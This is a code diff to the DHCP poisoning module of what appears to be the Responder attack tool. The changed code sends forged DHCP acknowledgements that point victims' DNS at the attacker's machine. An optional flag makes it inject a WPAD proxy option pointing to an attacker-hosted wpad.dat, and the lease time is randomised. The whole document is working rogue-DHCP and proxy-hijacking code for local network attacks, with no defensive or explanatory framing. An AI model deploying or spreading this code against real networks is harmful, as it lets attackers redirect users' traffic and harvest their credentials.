@@ -19,6 +19,7 @@ if (sys.version_info < (3, 0)):
    sys.exit('This script is meant to be run with Python3')
 
 import struct
+import random
 import optparse
 import configparser
 import os
@@ -82,7 +83,7 @@ Interface           = settings.Config.Interface
 Responder_IP        = RespondWithIP()
 ROUTERIP            = Responder_IP # Set to Responder_IP in case we fall on a static IP network and we don't get a DHCP Offer. This var will be updated with the real dhcp IP if present.
 NETMASK             = "255.255.255.0"
-DNSIP               = "0.0.0.0"
+DNSIP               = RespondWithIP()
 DNSIP2              = "0.0.0.0"
 DNSNAME             = "lan"
 WPADSRV             = "http://"+Responder_IP+"/wpad.dat"
@@ -197,22 +198,26 @@ class DHCPACK(Packet):
             ("Op6",               "\x06"),
             ("Op6Len",            "\x08"),
             ("Op6Str",            ""),                  #DNS Servers
-            ("Op252",             "\xfc"),
-            ("Op252Len",          "\x04"),
+            ("Op252",             ""),
+            ("Op252Len",          ""),
             ("Op252Str",          ""),                  #Wpad Server
             ("Op255",             "\xff"),
             ("Padding",           "\x00"),
     ])
 
-    def calculate(self):
+    def calculate(self, DHCP_WPAD):
         self.fields["Op54Str"]  = socket.inet_aton(ROUTERIP).decode('latin-1')
         self.fields["Op1Str"]   = socket.inet_aton(NETMASK).decode('latin-1')
         self.fields["Op3Str"]   = socket.inet_aton(ROUTERIP).decode('latin-1')
         self.fields["Op6Str"]   = socket.inet_aton(DNSIP).decode('latin-1')+socket.inet_aton(DNSIP2).decode('latin-1')
         self.fields["Op15Str"]  = DNSNAME
-        self.fields["Op252Str"] = WPADSRV
+        if DHCP_WPAD:
+             self.fields["Op252"]    = "\xfc"
+             self.fields["Op252Str"] = WPADSRV
+             self.fields["Op252Len"] = StructWithLenPython2or3(">b",len(str(self.fields["Op252Str"])))
+             self.fields["Op6Str"]   = socket.inet_aton('0.0.0.0').decode('latin-1')+socket.inet_aton(DNSIP2).decode('latin-1')
+        self.fields["Op51Str"]  = StructWithLenPython2or3('>L', random.randrange(10, 20))
         self.fields["Op15Len"]  = StructWithLenPython2or3(">b",len(str(self.fields["Op15Str"])))
-        self.fields["Op252Len"] = StructWithLenPython2or3(">b",len(str(self.fields["Op252Str"])))
 
 def RespondToThisIP(ClientIp):
     if ClientIp.startswith('127.0.0.'):
@@ -236,7 +241,7 @@ def FindIP(data):
     IP = ''.join(re.findall(r'(?<=\x32\x04)[^EOF]*', data))
     return ''.join(IP[0:4]).encode('latin-1')
 
-def ParseDHCPCode(data, ClientIP):
+def ParseDHCPCode(data, ClientIP,DHCP_WPAD):
     global DHCPClient
     global ROUTERIP
     PTid        = data[4:8]
@@ -262,7 +267,7 @@ def ParseDHCPCode(data, ClientIP):
             if RespondToThisIP(IPConv):
                 IP_Header = IPHead(SrcIP = socket.inet_aton(ROUTERIP).decode('latin-1'), DstIP=IP.decode('latin-1'))
                 Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), GiveClientIP=IP.decode('latin-1'), ElapsedSec=Seconds.decode('latin-1'))
-                Packet.calculate()
+                Packet.calculate(DHCP_WPAD)
                 Buffer = UDP(Data = Packet)
                 Buffer.calculate()
                 SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 68))
@@ -281,7 +286,7 @@ def ParseDHCPCode(data, ClientIP):
             if RespondToThisIP(IPConv):
                 IP_Header = IPHead(SrcIP = socket.inet_aton(ROUTERIP).decode('latin-1'), DstIP=IP.decode('latin-1'))
                 Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), GiveClientIP=IP.decode('latin-1'), DHCPOpCode="\x02", ElapsedSec=Seconds.decode('latin-1'))
-                Packet.calculate()
+                Packet.calculate(DHCP_WPAD)
                 Buffer = UDP(Data = Packet)
                 Buffer.calculate()
                 SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 0))
@@ -308,7 +313,7 @@ def SendDHCP(packet,Host):
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
 	s.sendto(NetworkSendBufferPython2or3(packet), Host)
 
-def DHCP():
+def DHCP(DHCP_WPAD):
     s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
     s.bind((Interface, 0x0800))
     SendDiscover()
@@ -318,6 +323,6 @@ def DHCP():
                 SrcIP, SrcPort, DstIP, DstPort = ParseSrcDSTAddr(data)
                 if SrcPort == 67 or DstPort == 67:
                     ClientIP = socket.inet_ntoa(data[0][26:30])
-                    ret = ParseDHCPCode(data[0][42:], ClientIP)
+                    ret = ParseDHCPCode(data[0][42:], ClientIP,DHCP_WPAD)
                     if ret:
                         print(text("[*] [DHCP] %s" % ret))
